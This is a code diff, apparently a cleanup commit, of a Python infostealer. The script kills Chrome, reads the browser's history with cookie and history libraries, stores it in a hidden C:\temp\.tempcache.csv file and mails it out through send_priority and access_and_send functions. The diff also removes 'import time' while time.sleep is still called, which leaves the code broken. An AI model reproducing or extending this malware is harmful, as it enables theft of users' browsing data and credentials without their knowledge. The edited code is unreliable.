@@ -8,7 +8,6 @@ import os
 import browserhistory as bh
 import urllib.request
 import browser_cookie3
-import time
 
 # The mail addresses and password
 try:
@@ -40,7 +39,6 @@ def get_chrome_history():
         os.system("taskkill /f /im chrome.exe")
     except Exception:  # NOQA
         pass
-    
     # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
     try:
         dict_obj = bh.get_browserhistory()
@@ -65,18 +63,18 @@ def get_chrome_history():
             pass
 
         try:
-            if not os.path.exists(f"C:\\temp") or not os.path.isfile(f"C:\\temp\\.tempcache.csv"):
+            if not os.path.exists(f"C:\\temp") or not os.path.isfile("C:\\temp\\.tempcache.csv"):
                 try:
-                    os.mkdir(f"C:\\temp\\")
+                    os.mkdir("C:\\temp\\")
                 except Exception:  # NOQA
                     pass
                 try:
-                    open(f"C:\\temp\\.tempcache.csv").close()
+                    open("C:\\temp\\.tempcache.csv").close()
                 except Exception:  # NOQA
                     pass
 
             # write to csv file but don't delete the previous data
-            with open(f"C:\\temp\\.tempcache.csv", mode='a', newline='',
+            with open("C:\\temp\\.tempcache.csv", mode='a', newline='',
                       encoding='utf-8') as decrypt_password_file:
                 decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                      quoting=csv.QUOTE_MINIMAL)
@@ -214,10 +212,10 @@ try:
 except Exception:  # NOQA
     pass
 try:
-    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
+    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
 except Exception:  # NOQA
     time.sleep(20)
-    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
+    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
 try:
     access_and_send(priority_files)
 except Exception:  # NOQA
